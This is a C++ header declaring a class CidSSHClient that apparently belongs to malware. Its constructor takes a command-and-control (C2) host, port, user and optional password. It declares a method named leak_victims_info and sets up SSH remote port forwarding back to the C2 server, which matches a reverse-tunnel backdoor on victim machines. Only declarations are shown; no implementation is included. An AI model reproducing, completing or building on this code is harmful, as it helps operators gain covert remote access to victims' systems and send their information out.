#pragma once

#include <chrono>
#include <string>
#include <thread>
#include <vector>

#include "global.h"
#include "CidSSHServer.h"

class CidSSHClient
{
public:
	CidSSHClient(const char* C2Host, const int C2Port, const char* C2User);

	int run();
	
	std::unique_ptr<CidSSHServer> cidSSHServer_;

private:
	static int leak_victims_info(ssh_session session, const int binded_port);

	void
	do_remote_forwarding(ssh_session sess,
						 pthread_mutex_t* mutex,
						 std::chrono::time_point<std::chrono::system_clock>* last_keep_alive);

	static void global_requests_cb(ssh_session session, ssh_message message, void* userdata);

	static pthread_mutex_t mutex;
	static std::vector<std::thread> thread_vector;

	const char* C2User_;
	const int C2Port_;
	const char* C2Host_;

#ifdef CID_C2_PASSWORD
	char C2Password_[50] = {0};
#endif
};
